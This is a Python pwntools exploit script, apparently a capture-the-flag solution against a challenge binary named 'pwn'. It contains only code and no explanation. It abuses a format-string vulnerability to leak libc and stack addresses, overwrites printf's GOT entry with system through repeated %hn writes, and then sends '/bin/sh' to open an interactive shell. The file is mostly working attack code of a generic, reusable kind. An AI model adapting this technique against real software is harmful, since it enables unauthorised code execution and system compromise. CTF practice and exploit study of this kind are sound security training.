#恶心的诸葛连弩
from pwn import*
context.log_level = 'debug'
p = process('./pwn')
# p=remote('ctf.npusec.org.cn',11817)
elf=ELF('./pwn')
libc=ELF('./libc.so.6')
printf_got=elf.got['printf']
print(f'hex(printf_got): {hex(printf_got)}')

# gdb.attach(p,'''
#            b*printf
#            ''')
# pause()
p.sendafter('2.exit',b'1')
p.sendafter('pay?',b'255')

payload=b'a'*0x100+b'%31$p'+b'a'*2
p.sendlineafter('report:',payload)
p.sendafter('2.exit',b'1')
p.sendafter('pay?',b'254')
leak=int(p.recvuntil(b'a'*2)[:-2],16)-139
print(f'Leak: {hex(leak)}')
libc_base=leak-libc.symbols['__libc_start_main']
print(f'Libc Base: {hex(libc_base)}')
system=libc_base+libc.symbols['system']
binsh=libc_base+next(libc.search(b'/bin/sh'))
print(f'System: {hex(system)}')
print(f'/bin/sh: {hex(binsh)}')

p.sendafter('2.exit',b'1')
p.sendafter('pay?',b'255')
payload=b'a'*0x100+b'%10$p'+b'a'*2
p.sendlineafter('report:',payload)
p.sendafter('2.exit',b'1')
p.sendafter('pay?',b'254')
leak=int(p.recvuntil(b'a'*2)[:-2],16)
print(f'Stack Leak: {hex(leak)}')
stack1=leak+-0x90

p.sendafter('2.exit',b'1')
p.sendafter('pay?',b'255')
payload=b'a'*0x100+f'%{stack1&0xffff}c%10$hn'.encode()
p.sendlineafter('report:',payload)
p.sendafter('2.exit',b'1')
p.sendafter('pay?',b'254')

p.sendafter('2.exit',b'1')
p.sendafter('pay?',b'255')
payload=b'a'*0x100+f'%{printf_got&0xffff}c%30$hn'.encode()
p.sendlineafter('report:',payload)
p.sendafter('2.exit',b'1')
p.sendafter('pay?',b'254')

p.sendafter('2.exit',b'1')
p.sendafter('pay?',b'255')
payload=b'a'*0x100+f'%{(stack1+2)&0xffff}c%10$hn'.encode()
p.sendlineafter('report:',payload)
p.sendafter('2.exit',b'1')
p.sendafter('pay?',b'254')

p.sendafter('2.exit',b'1')
p.sendafter('pay?',b'255')
payload=b'a'*0x100+f'%{(printf_got>>16)&0xffff}c%30$hn'.encode()
p.sendlineafter('report:',payload)
p.sendafter('2.exit',b'1')
p.sendafter('pay?',b'254')

p.sendafter('2.exit',b'1')
p.sendafter('pay?',b'255')
payload=b'a'*0x100+f'%{(stack1+4)&0xffff}c%10$hn'.encode()
p.sendlineafter('report:',payload)
p.sendafter('2.exit',b'1')
p.sendafter('pay?',b'254')

p.sendafter('2.exit',b'1')
p.sendafter('pay?',b'255')
payload=b'a'*0x100+f'%30$hn'.encode()
p.sendlineafter('report:',payload)
p.sendafter('2.exit',b'1')
p.sendafter('pay?',b'254')

p.sendafter('2.exit',b'1')
p.sendafter('pay?',b'255')
payload=b'a'*0x100+f'%{system&0xffff}c%12$hn'.encode()
p.sendlineafter('report:',payload)
p.sendafter('2.exit',b'1')
p.sendafter('pay?',b'254')

p.sendafter('2.exit',b'1')
p.sendafter('pay?',b'255')
payload=b'a'*0x100+f'%{stack1&0xffff}c%10$hn'.encode()
p.sendlineafter('report:',payload)
p.sendafter('2.exit',b'1')
p.sendafter('pay?',b'254')

p.sendafter('2.exit',b'1')
p.sendafter('pay?',b'255')
payload=b'a'*0x100+f'%{(printf_got+2)&0xffff}c%30$hn'.encode()
p.sendlineafter('report:',payload)
p.sendafter('2.exit',b'1')
p.sendafter('pay?',b'254')

p.sendafter('2.exit',b'1')
p.sendafter('pay?',b'255')
payload=b'a'*0x100+f'%{(system>>16)&0xffff}c%12$hn'.encode()
p.sendlineafter('report:',payload)
p.sendafter('2.exit',b'1')
p.sendafter('pay?',b'254')

p.sendafter('2.exit',b'1')
p.sendafter('pay?',b'255')
payload=b'a'*0x100+b'/bin/sh\x00'
p.sendlineafter('report:',payload)
p.sendafter('2.exit',b'1')
p.sendafter('pay?',b'254')

p.interactive()

